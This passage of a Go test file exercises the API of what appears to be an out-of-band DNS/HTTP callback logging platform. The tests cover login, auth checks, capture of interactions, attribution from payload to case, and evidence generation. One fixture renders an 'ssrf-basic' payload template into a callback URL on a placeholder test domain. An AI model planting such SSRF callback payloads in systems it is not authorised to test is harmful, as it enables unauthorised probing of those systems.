	guestSeedKey := fmt.Sprintf("%v.seed", guestUser.Id)
	guestUserKey := fmt.Sprintf("%v.user", guestUser.Id)
	store.Set(guestSeedKey, guestSeedStr, cache.NoExpiration)
	store.Set(guestUserKey, guestUser, cache.NoExpiration)

	// Guest user should be denied access
	guestAuditReq := httptest.NewRequest("GET", "/api/v2/audit/logs", nil)
	guestAuditReq.Header.Set("Access-Token", guestToken)
	guestAuditW := httptest.NewRecorder()
	r.ServeHTTP(guestAuditW, guestAuditReq)

	if guestAuditW.Code != http.StatusForbidden {
		t.Errorf("Expected status 403 for guest user, got %d: %s", guestAuditW.Code, guestAuditW.Body.String())
	}
}

func TestV2Login(t *testing.T) {
	gin.SetMode(gin.TestMode)

	// Create test server config
	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	// Create cache
	store := cache.NewCache(300, 60)

	// Create test server
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	// Initialize database and create test user
	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	// Create test user
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0, // super admin
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Initialize router
	r := gin.New()
	server.registerV2API(r)

	// Test login with valid credentials
	reqBody := `{"username": "testuser", "password": "password"}`
	req := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(reqBody))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	// Check response status
	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d. Body: %s", w.Code, w.Body.String())
	}

	// Check response format (ApiResponse format with lowercase fields)
	var response struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
			User  struct {
				Id       int64  `json:"id"`
				Username string `json:"username"`
				Email    string `json:"email"`
				Role     int    `json:"role"`
				Lang     string `json:"lang"`
			} `json:"user"`
		} `json:"data"`
	}

	if err := json.Unmarshal(w.Body.Bytes(), &response); err != nil {
		t.Fatalf("Failed to parse response: %v. Body: %s", err, w.Body.String())
	}

	// Verify code is 0 (success)
	if response.Code != 0 {
		t.Errorf("Expected code 0, got %d. Message: %s", response.Code, response.Message)
	}

	// Verify token is present
	if response.Data.Token == "" {
		t.Error("Expected token in response data")
	}

	// Verify user data is present
	if response.Data.User.Username != "testuser" {
		t.Errorf("Expected username 'testuser', got '%s'", response.Data.User.Username)
	}
}

func TestV2LoginInvalidCredentials(t *testing.T) {
	gin.SetMode(gin.TestMode)

	// Create test server config
	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	// Create cache
	store := cache.NewCache(300, 60)

	// Create test server
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	// Initialize database and create test user
	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	// Create test user
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser2",
		Email: "testuser2@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Initialize router
	r := gin.New()
	server.registerV2API(r)

	// Test login with invalid password
	reqBody := `{"username": "testuser2", "password": "wrongpassword"}`
	req := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(reqBody))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	// Should return 401
	if w.Code != http.StatusUnauthorized {
		t.Errorf("Expected status 401, got %d", w.Code)
	}

	// Check response format
	var response struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &response); err != nil {
		t.Fatalf("Failed to parse response: %v", err)
	}

	if response.Code != 401 {
		t.Errorf("Expected code 401, got %d", response.Code)
	}
}

func TestV2LoginUserNotFound(t *testing.T) {
	gin.SetMode(gin.TestMode)

	// Create test server config
	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	// Create cache
	store := cache.NewCache(300, 60)

	// Create test server
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	// Initialize database (no users created)
	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	// Initialize router
	r := gin.New()
	server.registerV2API(r)

	// Test login with non-existent user
	reqBody := `{"username": "nonexistent", "password": "password"}`
	req := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(reqBody))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	// Should return 401
	if w.Code != http.StatusUnauthorized {
		t.Errorf("Expected status 401, got %d", w.Code)
	}
}

func TestAuthMiddlewareRejectsMissingCredentials(t *testing.T) {
	gin.SetMode(gin.TestMode)

	engine := gin.New()
	server := &WebServer{}
	engine.GET("/protected", server.authHandler, func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"ok": true})
	})

	req := httptest.NewRequest(http.MethodGet, "/protected", nil)
	rec := httptest.NewRecorder()
	engine.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401, got %d with body %s", rec.Code, rec.Body.String())
	}
}

func TestCapturedHTTPLogAppearsInV2Interactions(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	// Simulate HTTP capture through the actual capture path
	session := server.orm.NewSession()
	defer session.Close()

	httpRecord := &models.TblHttp{
		Uid:    1,
		Var:    "tok123.example.com",
		Path:   "/callback",
		Ip:     "127.0.0.1",
		Ua:     "test-agent",
		Method: "GET",
	}

	// Insert legacy record
	if _, err := session.InsertOne(httpRecord); err != nil {
		t.Fatalf("Failed to insert HTTP log: %v", err)
	}

	// Dual-write to unified interactions table with attribution
	interaction := v2models.FromTblHttpWithAttribution(httpRecord, server.orm)
	if _, err2 := session.InsertOne(interaction); err2 != nil {
		t.Fatalf("Failed to dual-write interaction: %v", err2)
	}

	// Check if it appears in v2 interactions
	var interactions []v2models.Interaction
	if err := session.Find(&interactions); err != nil {
		t.Fatalf("Failed to query interactions: %v", err)
	}

	if len(interactions) != 1 {
		t.Fatalf("expected 1 interaction, got %d", len(interactions))
	}
	if interactions[0].Token == nil || *interactions[0].Token != "tok123.example.com" {
		t.Fatalf("expected token tok123.example.com, got %v", interactions[0].Token)
	}
}

func TestCapturedDNSLogAppearsInV2Interactions(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	// Simulate DNS capture through the actual capture path
	session := server.orm.NewSession()
	defer session.Close()

	dnsRecord := &models.TblDns{
		Uid:    1,
		Var:    "tok123.example.com",
		Domain: "tok123.example.com",
		Ip:     "127.0.0.1",
	}

	// Insert legacy record
	if _, err := session.InsertOne(dnsRecord); err != nil {
		t.Fatalf("Failed to insert DNS log: %v", err)
	}

	// Dual-write to unified interactions table with attribution
	interaction := v2models.FromTblDnsWithAttribution(dnsRecord, server.orm)
	if _, err2 := session.InsertOne(interaction); err2 != nil {
		t.Fatalf("Failed to dual-write interaction: %v", err2)
	}

	// Check if it appears in v2 interactions
	var interactions []v2models.Interaction
	if err := session.Find(&interactions); err != nil {
		t.Fatalf("Failed to query interactions: %v", err)
	}

	if len(interactions) != 1 {
		t.Fatalf("expected 1 interaction, got %d", len(interactions))
	}
	if interactions[0].Token == nil || *interactions[0].Token != "tok123.example.com" {
		t.Fatalf("expected token tok123.example.com, got %v", interactions[0].Token)
	}
	if interactions[0].Type != v2models.InteractionTypeDNS {
		t.Fatalf("expected type dns, got %s", interactions[0].Type)
	}
}

func TestInteractionTokenAttributionChain(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	// Sync tables for unified model
	if err := server.orm.Sync2(new(v2models.Case)); err != nil {
		t.Fatalf("Failed to sync cases table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Payload)); err != nil {
		t.Fatalf("Failed to sync payloads table: %v", err)
	}

	session := server.orm.NewSession()
	defer session.Close()

	// Create a case in unified models table
	caseID := "case-123"
	testCase := &v2models.Case{
		ID:          caseID,
		Title:       "Test Case",
		Description: "Test case for attribution",
		Status:      "active",
	}
	if _, err := session.InsertOne(testCase); err != nil {
		t.Fatalf("Failed to create case: %v", err)
	}

	// Create a payload with token
	token := "tok-attribution-test"
	expiresAt := time.Now().Add(24 * time.Hour)
	payload := &v2models.Payload{
		ID:               "payload-123",
		CaseID:           caseID,
		Token:            token,
		TemplateID:       "ssrf-basic",
		TemplateRendered: "https://" + token + ".test.example.com/callback",
		Status:           "active",
		ExpiresAt:        &expiresAt,
		CreatedBy:        "test-user",
		CreatedAt:        time.Now(),
	}
	if _, err := session.InsertOne(payload); err != nil {
		t.Fatalf("Failed to create payload: %v", err)
	}

	// Commit session to ensure payload is visible to engine
	if err := session.Commit(); err != nil {
		t.Fatalf("Failed to commit session: %v", err)
	}
	session.Close()

	// Re-open session for interaction operations
	session = server.orm.NewSession()
	defer session.Close()

	// Simulate DNS capture with the token
	dnsRecord := &models.TblDns{
		Uid:    1,
		Var:    token,
		Domain: token + ".test.example.com",
		Ip:     "127.0.0.1",
	}

	// Dual-write to unified interactions table with attribution
	interaction := v2models.FromTblDnsWithAttribution(dnsRecord, server.orm)

	if _, err2 := session.InsertOne(interaction); err2 != nil {
		t.Fatalf("Failed to dual-write interaction: %v", err2)
	}

	// Verify basic interaction fields
	if interaction.Token == nil || *interaction.Token != token {
		t.Fatalf("expected token %s, got %v", token, interaction.Token)
	}
	if interaction.Type != v2models.InteractionTypeDNS {
		t.Fatalf("expected type dns, got %s", interaction.Type)
	}

	// Verify interaction exists in database
	var retrievedInteraction v2models.Interaction
	has, err := session.Where("token = ?", token).Get(&retrievedInteraction)
	if err != nil {
		t.Fatalf("Failed to query interaction: %v", err)
	}
	if !has {
		t.Fatalf("Interaction with token %s not found in database", token)
	}

	// Verify attribution chain: interaction -> payload -> case
	// Check payload_id is correctly filled
	if retrievedInteraction.PayloadID == nil {
		t.Fatalf("Expected payload_id to be filled, got nil")
	}
	if *retrievedInteraction.PayloadID != payload.ID {
		t.Fatalf("Expected payload_id %s, got %s", payload.ID, *retrievedInteraction.PayloadID)
	}

	// Check case_id is correctly filled
	if retrievedInteraction.CaseID == nil {
		t.Fatalf("Expected case_id to be filled, got nil")
	}
	if *retrievedInteraction.CaseID != caseID {
		t.Fatalf("Expected case_id %s, got %s", caseID, *retrievedInteraction.CaseID)
	}

	t.Logf("Attribution chain verified: interaction -> payload_id=%s -> case_id=%s", *retrievedInteraction.PayloadID, *retrievedInteraction.CaseID)
}

func TestPayloadPreviewReturnsRenderedTemplate(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	// Sync the payloads table for the unified model
	if err := server.orm.Sync2(new(v2models.Payload)); err != nil {
		t.Fatalf("Failed to sync payloads table: %v", err)
	}

	// Create a test user with hashed password
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Login to get token
	r := gin.New()
	server.registerV2API(r)

	loginBody := `{"username": "testuser", "password": "password"}`
	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(loginBody))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	if loginW.Code != http.StatusOK {
		t.Fatalf("Login failed with status %d: %s", loginW.Code, loginW.Body.String())
	}

	var loginResponse map[string]interface{}
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResponse); err != nil {
		t.Fatalf("Failed to parse login response: %v", err)
	}

	token := loginResponse["data"].(map[string]interface{})["token"].(string)
	t.Logf("Login successful, got token: %s", token)

	// Extract seed from JWT token and set in cache (workaround for cache isolation issue)
	userId := user.Id
	seedKey := fmt.Sprintf("%v.seed", userId)
	userKey := fmt.Sprintf("%v.user", userId)

	// Parse the JWT token to get the seed
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		// Decode the payload (middle part)
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					t.Logf("Extracted seed from JWT: %s", seedStr)
					store.Set(seedKey, seedStr, cache.NoExpiration)
					seedValAfter, seedExistsAfter := store.Get(seedKey)
					t.Logf("After manual set, seed exists: %v, value: %v", seedExistsAfter, seedValAfter)
				}
			}
		}
	}

	// Verify cache entries
	seedVal, seedExists := store.Get(seedKey)
	userVal, userExists := store.Get(userKey)
	t.Logf("Cache seed exists: %v, user exists: %v", seedExists, userExists)
	if seedExists {
		t.Logf("Seed value: %v", seedVal)
	}
	if userExists {
		t.Logf("User value: %v", userVal)
	}

	// Create a test payload using the unified model
	payloadService := payload.NewService(server.orm)
	req := &v2models.PayloadCreateRequest{
		CaseID:           "case-123",
		TemplateID:       "ssrf-basic",
		Variables:        map[string]string{},
		ExpectedProtocol: "http",
	}
	payload, err := payloadService.CreatePayload(req, "1", "test.example.com")
	if err != nil {
		t.Fatalf("Failed to create payload: %v", err)
	}

	// Test preview endpoint with valid auth token
	httpReq := httptest.NewRequest(http.MethodPost, "/api/v2/payloads/"+payload.ID+"/preview", nil)
	httpReq.Header.Set("Access-Token", token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, httpReq)

	// Should return 200 with rendered template
	if w.Code != http.StatusOK {
		t.Fatalf("Expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var response map[string]interface{}
	if err := json.Unmarshal(w.Body.Bytes(), &response); err != nil {
		t.Fatalf("Failed to parse response: %v", err)
	}

	if response["code"].(float64) != 0 {
		t.Fatalf("Expected code 0, got %v", response["code"])
	}

	data := response["data"].(map[string]interface{})
	renderedPayload := data["rendered_payload"].(string)
	if renderedPayload == "" {
		t.Fatal("Expected rendered_payload to be non-empty")
	}

	// Verify rendered payload contains token and domain
	if !strings.Contains(renderedPayload, payload.Token) {
		t.Errorf("Expected rendered_payload to contain token %s", payload.Token)
	}
	if !strings.Contains(renderedPayload, "test.example.com") {
		t.Error("Expected rendered_payload to contain domain")
	}

	// Test preview with non-existent payload (should return 404)
	httpReq2 := httptest.NewRequest(http.MethodPost, "/api/v2/payloads/nonexistent-id/preview", nil)
	httpReq2.Header.Set("Access-Token", token)
	w2 := httptest.NewRecorder()
	r.ServeHTTP(w2, httpReq2)

	if w2.Code != http.StatusNotFound {
		t.Errorf("Expected status 404 for non-existent payload, got %d", w2.Code)
	}
}

func TestV2APIResponseFormat(t *testing.T) {
	gin.SetMode(gin.TestMode)

	// Create test server config
	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	// Create cache
	store := cache.NewCache(300, 60)

	// Create test server
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	// Initialize router
	r := gin.New()
	server.registerV2API(r)

	// Test that v2 APIs return correct format
	testCases := []struct {
		method       string
		path         string
		body         string
		expectCode   int
		expectFields []string
	}{
		{
			method:       "GET",
			path:         "/api/v2/cases",
			body:         "",
			expectCode:   http.StatusUnauthorized, // Should fail without auth
			expectFields: []string{"code", "message"},
		},
	}

	for _, tc := range testCases {
		req := httptest.NewRequest(tc.method, tc.path, strings.NewReader(tc.body))
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != tc.expectCode {
			t.Errorf("Path %s: Expected status %d, got %d", tc.path, tc.expectCode, w.Code)
		}

		var response map[string]interface{}
		if err := json.Unmarshal(w.Body.Bytes(), &response); err != nil {
			t.Errorf("Path %s: Failed to parse response: %v", tc.path, err)
			continue
		}

		for _, field := range tc.expectFields {
			if _, ok := response[field]; !ok {
				t.Errorf("Path %s: Expected field '%s' in response", tc.path, field)
			}
		}
	}
}

// Evidence API validation tests
// These tests verify the endpoint validation and error handling for /api/v2/evidence/generate
// Note: 404 (no evidence) scenario is covered in service layer tests (internal/interaction/evidence_service_test.go)

func TestV2GenerateEvidence_EmptyParams(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	type LoginResponse struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	var loginResp LoginResponse
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT token and set in cache (workaround for cache isolation issue)
	userId := user.Id
	seedKey := fmt.Sprintf("%v.seed", userId)
	userKey := fmt.Sprintf("%v.user", userId)

	// Parse the JWT token to get the seed
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		// Decode the payload (middle part)
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, cache.NoExpiration)
				}
			}
		}
	}

	// Set user in cache
	store.Set(userKey, user, cache.NoExpiration)

	// Test empty params (neither case_id nor payload_id)
	evidenceReq := httptest.NewRequest("POST", "/api/v2/evidence/generate", strings.NewReader(`{"format":"json"}`))
	evidenceReq.Header.Set("Content-Type", "application/json")
	evidenceReq.Header.Set("Access-Token", token)
	evidenceW := httptest.NewRecorder()
	r.ServeHTTP(evidenceW, evidenceReq)

	if evidenceW.Code != http.StatusBadRequest {
		t.Fatalf("Expected status 400, got %d: %s", evidenceW.Code, evidenceW.Body.String())
	}

	var response map[string]interface{}
	if err := json.Unmarshal(evidenceW.Body.Bytes(), &response); err != nil {
		t.Fatalf("Failed to unmarshal response: %v", err)
	}
	if response["code"].(float64) != 1 {
		t.Errorf("Expected code 1, got %v", response["code"])
	}
	if response["message"] != "Either case_id or payload_id is required" {
		t.Errorf("Expected 'Either case_id or payload_id is required', got %v", response["message"])
	}
}

func TestV2GenerateEvidence_InvalidFormat(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	type LoginResponse struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	var loginResp LoginResponse
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT token and set in cache (workaround for cache isolation issue)
	userId := user.Id
	seedKey := fmt.Sprintf("%v.seed", userId)
	userKey := fmt.Sprintf("%v.user", userId)

	// Parse the JWT token to get the seed
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		// Decode the payload (middle part)
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, cache.NoExpiration)
				}
			}
		}
	}

	// Set user in cache
	store.Set(userKey, user, cache.NoExpiration)

	// Test invalid format
	evidenceReq := httptest.NewRequest("POST", "/api/v2/evidence/generate", strings.NewReader(`{"case_id":"test","format":"invalid"}`))
	evidenceReq.Header.Set("Content-Type", "application/json")
	evidenceReq.Header.Set("Access-Token", token)
	evidenceW := httptest.NewRecorder()
	r.ServeHTTP(evidenceW, evidenceReq)

	if evidenceW.Code != http.StatusBadRequest {
		t.Fatalf("Expected status 400, got %d: %s", evidenceW.Code, evidenceW.Body.String())
	}
}

func TestV2GenerateEvidence_SuccessWithCaseID(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Create a test interaction with case_id
	caseID := "test-case-123"
	domain := "test.example.com"
	interaction := &v2models.Interaction{
		ID:        v2models.GenerateID(),
		Type:      "dns",
		CaseID:    &caseID,
		SourceIP:  "127.0.0.1",
		Timestamp: time.Now(),
		Domain:    &domain,
	}
	if _, err := server.orm.Insert(interaction); err != nil {
		t.Fatalf("Failed to create test interaction: %v", err)
	}

	// Verify interaction was inserted
	count, err := server.orm.Where("case_id = ?", caseID).Count(&v2models.Interaction{})
	if err != nil {
		t.Fatalf("Failed to count interactions: %v", err)
	}
	if count == 0 {
		t.Fatal("Interaction was not inserted")
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	type LoginResponse struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	var loginResp LoginResponse
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT token and set in cache
	userId := user.Id
	seedKey := fmt.Sprintf("%v.seed", userId)
	userKey := fmt.Sprintf("%v.user", userId)
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, cache.NoExpiration)
				}
			}
		}
	}
	store.Set(userKey, user, cache.NoExpiration)

	// Test successful evidence generation with case_id
	evidenceReq := httptest.NewRequest("POST", "/api/v2/evidence/generate", strings.NewReader(`{"case_id":"test-case-123","format":"json"}`))
	evidenceReq.Header.Set("Content-Type", "application/json")
	evidenceReq.Header.Set("Access-Token", token)
	evidenceW := httptest.NewRecorder()
	r.ServeHTTP(evidenceW, evidenceReq)

	if evidenceW.Code != http.StatusOK {
		t.Fatalf("Expected status 200, got %d: %s", evidenceW.Code, evidenceW.Body.String())
	}

	var response map[string]interface{}
	if err := json.Unmarshal(evidenceW.Body.Bytes(), &response); err != nil {
		t.Fatalf("Failed to unmarshal response: %v", err)
	}
	if response["code"].(float64) != 0 {
		t.Errorf("Expected code 0, got %v", response["code"])
	}

	// Verify data.evidence is present
	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatal("Expected data to be a map")
	}
	if data["evidence"] == nil {
		t.Error("Expected evidence field in data")
	}
}

func TestV2GenerateEvidence_SuccessWithPayloadID(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
